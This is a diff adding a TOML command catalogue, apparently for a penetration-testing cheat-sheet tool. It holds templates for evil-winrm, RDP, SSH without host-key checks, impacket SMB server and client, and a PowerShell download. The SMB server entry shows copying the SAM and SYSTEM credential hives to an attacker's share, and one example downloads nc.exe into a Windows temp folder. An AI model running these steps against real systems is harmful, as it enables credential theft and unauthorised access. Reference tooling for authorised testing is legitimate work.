@@ -1,0 +1,111 @@
+[command.Evil-WinRM]
+use_name = "evil-winrm"
+local = false
+cmd_types = "network"
+args = "evil-winrm -i <ip|127.0.0.1> -u <username> -p <password>"
+short_desc = "Connect to an Windows machine using WinRM protocol"
+details = """
+Few problem may occur with this tool, then do: `export OPENSSL_CONF=/home/user/evilwinrm.conf` 
+
+This file (.conf) must contains this:
+```
+openssl_conf = openssl_init
+[openssl_init]
+providers = provider_sect
+[provider_sect]
+default = default_sect
+legacy = legacy_sect
+[default_sect]
+activate = 1
+[legacy_sect]
+activate = 1
+```"""
+examples = [
+    "evil-winrm -i 127.0.0.1 -u 'domain/username' -p 'password'"
+]
+
+[command.Remmina]
+use_name = "remmina"
+local = false
+cmd_types = "network|windows"
+args = "remmina -c rdp://<username|user>:<password|pass>@<ip|127.0.0.1>"
+short_desc = "Connect with GUI to an Windows machine with RDP protocol."
+examples = [
+    "remmina -c rdp://user:password@127.0.0.1"
+]
+
+[command.XfreeRDP-0]
+use_name = "xfreerdp"
+local = false
+cmd_types = "network|windows"
+args = "xfreerdp /cert:<status|ignore> /d:<domain|corp.local> /u:<user> /p:<password> /v:<ip|127.0.0.1> /dynamic-resolution"
+short_desc = "Connect with GUI to an Windows machine with RDP protocol."
+examples = [
+    "xfreerdp /u:user /p:password /v:127.0.0.1"
+]
+
+[command.XfreeRDP-1]
+use_name = "xfreerdp"
+local = false
+cmd_types = "network|windows"
+args = "xfreerdp /cert:<status|ignore> /compression /auto-reconnect /dynamic-resolution /d:<domain|corp.local> /u:<user> /p:<password> /v:<ip|127.0.0.1> /drive:<share-drive-name|share>,<share-local-folder|/tmp/shared>"
+short_desc = "Connect with GUI to an Windows machine with RDP protocol and mount share drive."
+examples = [
+    "xfreerdp /cert-ignore /compression /auto-reconnect /dynamic-resolution /d:corp.local /u:user /p:password /v:127.0.0.1 /drive:share,/tmp/shared"
+]
+
+[command.SSH]
+use_name = "ssh"
+local = false
+cmd_types = "network"
+args = "ssh -o 'UserKnownHostsFile=/dev/null' -o 'StrictHostKeyChecking=no' -o 'Loglevel=QUIET' <username|user>@<hostname|127.0.0.1>"
+short_desc = "Connect with SSH without saving nor checking known host."
+examples = [
+    "ssh -o 'UserKnownHostsFile=/dev/null' -o 'StrictHostKeyChecking=no' -o 'Loglevel=QUIET' user@127.0.0.1"
+]
+
+[command.SMBServer]
+use_name = "smbserver impacket"
+local = true
+cmd_types = "network"
+args = "smbserver.py <share_name|test> <share_path|/tmp/share/> -smb2support  -username <user|user> -password <password|password>"
+short_desc = "Open an SMB server for multi-purpose actions"
+details = """
+net use \\\\127.0.0.1\\test /user:test test
+copy SAM \\\\127.0.0.1\\test\\SAM
+copy SYSTEM \\\\127.0.0.1\\test\\SYSTEM
+"""
+examples = [
+    "sudo smbserver.py test /tmp/share/ -smb2support  -username test -password test"
+]
+
+[command.PowerShell-Download]
+use_name = "powershell"
+local = false
+cmd_types = "network"
+args = "powershell -Uri http://<ip|127.0.0.1>/<file> -OutFile <ofile|C:/Windows/Temp/f.exe>"
+short_desc = "Download file from Windows PowerShell"
+examples = [
+    "powershell wget -Uri http://127.0.0.1/nc.exe -OutFile C:/Windows/Temp/nc.exe"
+]
+
+[command.SMBClient-0]
+use_name = "smbclient impacket"
+local = false
+cmd_types = "pentest"
+short_desc = "Connect an smb share"
+args = "smbclient.py <share|c> <path|./>"
+examples = [
+    "smbclient.py c ./"
+]
+
+[command.SMBClient-1]
+use_name = "smbclient"
+local = false
+cmd_types = "pentest"
+short_desc = "Connect an smb share"
+args = "smbclient -L //<ip|127.0.0.1>/ -U <user> --password=<password>"
+examples = [
+    "smbclient -L //127.0.0.1/ -U user --password=adminpass"
+]
+
